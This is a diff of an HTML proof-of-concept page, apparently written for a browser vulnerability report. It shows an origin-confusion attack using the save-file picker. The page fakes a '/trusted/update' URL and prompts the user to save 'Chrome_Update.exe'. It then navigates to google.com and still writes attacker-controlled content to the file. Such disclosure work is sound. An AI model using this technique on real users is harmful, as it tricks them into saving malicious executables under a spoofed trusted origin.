@@ -1,74 +1,37 @@
 <!doctype html>
-<html>
-<head>
-<meta charset="utf-8">
-<title>Save File Picker + Navigation Race PoC</title>
-<style>
-#panel {
-  display: none;
-  position: fixed;
-  inset: 0;
-  background: white;
-  z-index: 9999;
-}
-</style>
-</head>
+<title>File Picker Origin Confusion PoC</title>
 
-<body>
-
-<h1 id="trigger">Click anywhere</h1>
-
-<div id="panel">
-  <h2>Trusted Panel</h2>
-</div>
+<h1 id="trigger">Click to continue</h1>
 
 <script>
-const trigger = document.getElementById('trigger');
-const panel = document.getElementById('panel');
+let fileHandle;
 
-/*
- * Step 1:
- * Fake trusted state before picker
- */
-trigger.onclick = async () => {
-  history.pushState({}, '', '/trusted');
-  panel.style.display = 'block';
+document.getElementById('trigger').onclick = async () => {
+  // Step 1: Fake trusted URL
+  history.pushState({}, '', '/trusted/update');
 
-  if (!window.showSaveFilePicker) return;
-
-  try {
-    // Save File Picker
-    const handle = await showSaveFilePicker({
-      suggestedName: 'Chrome_Update.exe',
-      types: [{
-        description: 'Executable File',
-        accept: { 'application/octet-stream': ['.exe'] }
-      }]
-    });
-
-    const w = await handle.createWritable();
-    await w.write('PoC ONLY\nNot a real executable');
-    await w.close();
-
-  } catch (e) {
-    // cancel expected
-  }
-};
-
-/*
- * Step 2:
- * Trigger navigation race after permission flow
- */
-window.addEventListener('pageshow', () => {
-  requestAnimationFrame(() => {
-    requestAnimationFrame(() => {
-      setTimeout(() => {
-        location.href = 'https://google.com:9090';
-      }, 80);
-    });
+  // Step 2: Open privileged picker
+  fileHandle = await showSaveFilePicker({
+    suggestedName: 'Chrome_Update.exe',
+    types: [{
+      description: 'Executable',
+      accept: { 'application/octet-stream': ['.exe'] }
+    }]
   });
-});
-</script>
 
-</body>
-</html>
+  // Step 3: Navigation race
+  setTimeout(() => {
+    location.href = 'https://www.google.com';
+  }, 50);
+
+  // Step 4: Attacker STILL writes file
+  setTimeout(async () => {
+    const writable = await fileHandle.createWritable();
+    await writable.write(
+      'ATTACKER-CONTROLLED CONTENT\n' +
+      'User believed Google requested this file'
+    );
+    await writable.close();
+  }, 200);
+};
+</script>
